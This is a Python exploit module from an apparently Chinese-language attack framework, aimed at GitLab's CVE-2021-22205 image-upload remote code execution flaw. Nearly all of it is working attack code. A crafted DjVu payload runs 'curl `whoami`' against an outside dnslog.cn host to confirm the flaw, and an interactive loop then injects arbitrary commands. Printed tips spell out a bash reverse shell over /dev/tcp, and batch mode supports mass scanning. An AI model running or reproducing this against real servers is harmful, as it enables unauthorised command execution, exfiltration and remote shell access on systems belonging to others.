#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests
from bs4 import BeautifulSoup
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from rich.prompt import Prompt
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
requests.packages.urllib3.disable_warnings()
class Cve_2021_22205:

    def title(self):
        print("""
    	  ______     _______     ____   ___ ____  _      ____  ____  ____   ___  ____  
    	 / ___\ \   / / ____|   |___ \ / _ \___ \/ |    |___ \|___ \|___ \ / _ \| ___| 
    	| |    \ \ / /|  _| _____ __) | | | |__) | |_____ __) | __) | __) | | | |___ \ 
    	| |___  \ V / | |__|_____/ __/| |_| / __/| |_____/ __/ / __/ / __/| |_| |___) |
     	\____ |  \_/  |_____|   |_____|\___/_____|_|    |_____|_____|_____|\___/|____/ 

     	                                Author:Al1ex@Heptagram
                                    Github:https://github.com/Al1ex                             
        	""")


    def check(self,target_url):
        session = requests.Session()
        try:
            req1 = session.get(target_url.strip("/") + "/users/sign_in", verify=self.verify,proxies=self.proxy)
            soup = BeautifulSoup(req1.text, features="lxml")
            token = soup.findAll('meta')[16].get("content")
            data = "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{curl `whoami`.82sm53.dnslog.cn} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"
            headers = {
                "User-Agent": self.header,
                "Connection": "close",
                "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5",
                "X-CSRF-Token": f"{token}", "Accept-Encoding": "gzip, deflate"}
            flag = 'Failed to process image'
            req2 = session.post(target_url.strip("/") + "/uploads/user", data=data, headers=headers, verify=self.verify,proxies=self.proxy)
            if flag in req2.text:
                OutPrintInfoSuc("GitLab",f"目标 {target_url} 存在漏洞")
                if self.batch:
                    OutPutFile("gitlab_2021_22205.txt",f"目标 {target_url} 存在漏洞")
                return True
            else:
                if not self.batch:
                    OutPrintInfo("GitLab", f"目标 {target_url} 不存在漏洞")
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("GitLab", f"目标请求出错")
            return False

    def attack(self,target_url, command):
        session = requests.Session()
        try:
            req1 = session.get(target_url.strip("/") + "/users/sign_in", verify=self.verify,proxies=self.proxy)
            soup = BeautifulSoup(req1.text, features="lxml")
            token = soup.findAll('meta')[16].get("content")
            data = "\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nAT&TFORM\x00\x00\x03\xafDJVMDIRM\x00\x00\x00.\x81\x00\x02\x00\x00\x00F\x00\x00\x00\xac\xff\xff\xde\xbf\x99 !\xc8\x91N\xeb\x0c\x07\x1f\xd2\xda\x88\xe8k\xe6D\x0f,q\x02\xeeI\xd3n\x95\xbd\xa2\xc3\"?FORM\x00\x00\x00^DJVUINFO\x00\x00\x00\n\x00\x08\x00\x08\x18\x00d\x00\x16\x00INCL\x00\x00\x00\x0fshared_anno.iff\x00BG44\x00\x00\x00\x11\x00J\x01\x02\x00\x08\x00\x08\x8a\xe6\xe1\xb17\xd9*\x89\x00BG44\x00\x00\x00\x04\x01\x0f\xf9\x9fBG44\x00\x00\x00\x02\x02\nFORM\x00\x00\x03\x07DJVIANTa\x00\x00\x01P(metadata\n\t(Copyright \"\\\n\" . qx{" + command + "} . \\\n\" b \") )                                                                                                                                                                                                                                                                                                                                                                                                                                     \n\r\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\r\n\r\n"
            headers = {
                "User-Agent": self.header,
                "Connection": "close",
                "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5",
                "X-CSRF-Token": f"{token}", "Accept-Encoding": "gzip, deflate"}
            flag = 'Failed to process image'
            req2 = session.post(target_url.strip("/") + "/uploads/user", data=data, headers=headers, verify=self.verify,proxies=self.proxy)
            if flag in req2.text:
                OutPrintInfoSuc("GitLab",f"目标 {target_url} 存在漏洞")
                OutPrintInfo("GitLab", f"请到dnslog或主机检查执行结果")

            else:
                OutPrintInfo("GitLab", f"目标 {target_url} 不存在漏洞")

        except Exception as e:

            OutPrintInfo("GitLab", f"目标请求出错")

    def format_url(self,url):
        try:
            if url[:4] != "http":
                url = "https://" + url
                url = url.strip()
            return url
        except Exception as e:
            if not self.batch:
                OutPrintInfo("GitLab", f"URL 错误{url}")



    def main(self,target):
        self.batch = target["batch_work"]
        if not self.batch:
            self.title()
        target_url = target['url'].strip("/ ")
        self.verify = target["ssl"]
        self.header = target["header"]
        proxy = target["proxy"]
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)




        if self.check(target_url):
            if not self.batch:
                choose = Prompt.ask("[b yellow]是否进行RCE利用([b bright_red]y/n[/b bright_red])")
                if choose == "y":
                    OutPrintInfo("GitLab","[b bright_red]Tips")
                    OutPrintInfo("GitLab","[b bright_red]此漏洞可能不存在回显")
                    OutPrintInfo("GitLab","echo 'bash -i >& /dev/tcp/your-ip/9999 0>&1' > /tmp/1.sh")
                    OutPrintInfo("GitLab","chmod +x /tmp/1.sh")
                    OutPrintInfo("GitLab","/bin/bash /tmp/1.sh")
                    while True:
                        cmd = Prompt.ask("[b yellow]输入需要执行到命令")
                        if cmd == "exit":
                            break
                        self.attack(target_url, cmd)




